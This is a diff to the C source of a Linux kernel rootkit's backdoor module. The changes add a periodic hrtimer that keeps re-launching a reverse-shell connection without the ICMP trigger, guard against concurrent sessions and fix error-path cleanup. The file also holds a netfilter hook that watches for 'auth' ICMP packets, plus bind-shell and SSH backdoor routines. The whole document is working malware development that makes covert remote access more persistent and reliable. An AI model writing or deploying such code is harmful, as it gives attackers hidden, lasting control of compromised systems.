@@ -11,6 +11,14 @@
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
 
+#include <linux/interrupt.h>
+#include <linux/hrtimer.h>
+#include <linux/sched.h>
+
+static struct hrtimer htimer;
+static ktime_t kt_periode;
+static int backdoor_active = 0; // avoid launch to connection
+
 struct workqueue_struct *work_queue;
 struct work_cont *work;
 
@@ -83,7 +91,7 @@ static int rk_recvbuff(struct socket *sock, char *buffer, int length)
     set_fs(oldfs);
 
     if ((len!=-EAGAIN)&&(len!=0)&&(len!=(-107)))
-        dbg("rk_recvbuff recieved %i bytes \n",len);
+        dbg("backdoor: rk_recvbuff recieved %i bytes \n",len);
     return len;
 }
 
@@ -174,12 +182,13 @@ static void backdoor_reverse(void)
         sock_release(sock);
         return;
     }
-    
+
     buff = kmalloc(512, GFP_KERNEL);
     if (buff == NULL)
     {
         dbg("backdoor: Error allocating memory\n");
         sock_release(sock);
+
         return;
     }
 
@@ -263,6 +272,7 @@ static void backdoor_bind(void)
     if (error < 0) {
         dbg("backdoor: Error listening on socket \n");
         sock_release(sock);
+
         return;
     }
     char *buff = NULL;
@@ -274,7 +284,8 @@ static void backdoor_bind(void)
     if(error<0) {
         dbg("backdoor: Error create newsock error\n");
         kfree(buff);
-        sock_release(sock);  
+        sock_release(sock);
+
         return; 
     }
     //wait incoming connection
@@ -291,6 +302,10 @@ static void backdoor_bind(void)
                     result = kmalloc(1024, GFP_KERNEL);
                     if ( ! result ) {
                         dbg("backdoor: Error allocating memory\n");
+                
+                        kfree(buff);
+                        sock_release(newsock);
+                        sock_release(sock);
                         return;
                     }
                     int bytes_read;
@@ -304,6 +319,7 @@ static void backdoor_bind(void)
                     if (res == 0) {
                         remove_file();
                         dbg("backdoor: Error during connection of socket; terminating\n");
+                
                         break;
                     }
                     tt = 0;
@@ -337,13 +353,26 @@ static void thread_function(struct work_struct *work_arg)
 
     dbg("backdoor: deferred work PID %d \n", current->pid);
 
+    backdoor_active = 1;
     // TODO regarding issue #16 the activation backdoor will be release
     backdoor_reverse();
     //backdoor_bind();
 
+    backdoor_active = 0;
     kfree(c_ptr);
 
     return;
+}
+
+static void run_task(void) {
+    dbg("backdoor: Starting the task\n");
+    work = kmalloc(sizeof(*work), GFP_KERNEL);
+    if ( !work ) {
+        dbg("backdoor: Error alloc work_queue");
+        return;
+    }
+    INIT_WORK(&work->real_work, thread_function);
+    schedule_work(&work->real_work);
 }
 
 /* function originaly taken from suterusu repository, adapted to our rootkit */
@@ -375,25 +404,31 @@ static unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, cons
         return NF_ACCEPT;
 
     dbg("backdoor: Received auth ICMP packet\n");
-    dbg("backdoor: Starting the task\n");
-    work = kmalloc(sizeof(*work), GFP_KERNEL);
-    if ( !work ) {
-        dbg("backdoor: Error alloc work_queue");
-        return;
-    }
-    INIT_WORK(&work->real_work, thread_function);
-    schedule_work(&work->real_work);
+
+    if (!backdoor_active)
+        run_task();
 
     return NF_ACCEPT;
+}
+
+static enum hrtimer_restart timer_function(struct hrtimer * timer)
+{
+    dbg("backdoor: Timer done\n");
+
+    if (!backdoor_active)
+        run_task();
+
+    hrtimer_forward_now(timer, kt_periode);
+    return HRTIMER_RESTART;
 }
 
 void backdoor_exit ( void )
 {
     dbg("backdoor: Stopping monitoring ICMP packets via netfilter\n");
     kfree(work);
+    hrtimer_cancel(& htimer);
     nf_unregister_hook(&pre_hook);
 }
-
 
 void backdoor(void) 
 {
@@ -403,8 +438,14 @@ void backdoor(void)
         backdoor_ssh();
     }
 
-    dbg("backdoor: Monitoring ICMP packets via netfilter\n");
+    /* timer callback */
+    kt_periode = ktime_set(TIMER_BACKDOOR, 0); //seconds,nanoseconds
+    hrtimer_init (& htimer, CLOCK_REALTIME, HRTIMER_MODE_REL);
+    htimer.function = timer_function;
+    hrtimer_start(& htimer, kt_periode, HRTIMER_MODE_REL);
 
+    /* firewall socket */
+    dbg("backdoor: Monitoring ICMP packets via netfilter\n");
     pre_hook.hook     = watch_icmp;
     pre_hook.pf       = PF_INET;
     pre_hook.priority = NF_IP_PRI_FIRST;
@@ -412,3 +453,4 @@ void backdoor(void)
 
     nf_register_hook(&pre_hook);   
 }
+
